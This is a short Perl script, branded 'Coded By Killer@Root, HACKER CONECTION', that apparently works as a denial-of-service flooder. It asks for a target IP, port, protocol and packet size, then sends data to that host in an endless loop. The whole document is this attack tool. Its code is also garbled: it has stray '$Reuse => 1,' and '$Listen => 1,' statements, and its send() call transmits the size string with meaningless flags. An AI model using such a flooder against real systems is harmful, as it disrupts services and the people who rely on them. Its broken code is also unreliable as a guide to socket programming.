#!/usr/bin/perl

print q{
=================================================
=                                               =
=                  Coded By                     =
=                                               =
=                Killer@Root                    =
=                                               =
=             HACKER CONECTION                  =
=                                               =
=                                               =
=                                               =
=================================================

};

use IO::Socket::INET;

print "IP: -> ";
chop ($host = <stdin>);
print "PORT: -> ";
chop ($port = <stdin>);
print "protocol TCP / UDP: -> ";
chop ($protocol = <stdin>);
print "SIZE: -> ";
chop ($size = <stdin>);

{
$sock = IO::Socket::INET->new (
  PeerAddr => $host,
  PeerPort => $port,
  Proto => $protocol) 
        || die "the IP or PORT is incorrect, please check the IP and PORT";
}
packets:
while (1) {
size => $size;
$Reuse => 1,
$Listen => 1,
print ("$host:$port packet size: $size\n");
send($sock, $size, $Reuse, $Listen);
} 
